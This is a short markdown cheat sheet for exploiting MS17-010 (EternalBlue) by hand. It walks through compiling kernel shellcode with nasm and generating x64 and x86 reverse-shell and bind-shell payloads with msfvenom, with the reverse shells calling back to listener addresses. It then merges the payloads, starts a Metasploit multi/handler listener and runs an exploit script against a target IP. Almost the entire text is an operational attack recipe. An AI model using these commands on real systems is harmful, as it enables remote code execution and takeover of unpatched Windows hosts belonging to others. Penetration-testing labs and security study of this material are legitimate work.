# MS17-010 manual exploit

Original Source  https://github.com/worawit/MS17-010

## Creating payload for X64
### Compiling x64 kernel shellcode
    nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
### Reverse shell
    msfvenom -p windows/x64/shell/reverse_tcp EXITFUNC=thread lhost=192.168.1.10 lport=4443 -f raw -o sc_x64_msf.bin
### Bind shell
    msfvenom -p windows/x64/shell/bind_tcp EXITFUNC=thread LPORT=4443 -f raw -o sc_x64_msf.bin
### Combine both nasm output and our payload
    cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
## Creating payload for X86
### Compiling x86 kernel shellcode
    nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
### Reverse shell
    msfvenom -p windows/shell/reverse_tcp EXITFUNC=thread LHOST=192.168.1.100 LPORT=4444 -f raw -o sc_x86_msf.bin
### Bind shell
    msfvenom -p windows/shell/bind_tcp EXITFUNC=thread LPORT=4444 -f raw -o sc_x86_msf.bin

## Combine both nasm output and our payload    
    cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin

## Listener

    msfconsole

    use exploit/multi/handler
    set payload <payload you specified with msfvenom>
    set lport 4443
    set rhost 192.168.1.100
    exploit -j

    Do the same steps for port 4444
    So two listener will be running at same time
## Combine both x86 and x64 payload (if we don't know the architecture of the attacking machine)
    python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
## Run the code
    python eternalblue_exploit7.py 192.168.1.100 sc_all.bin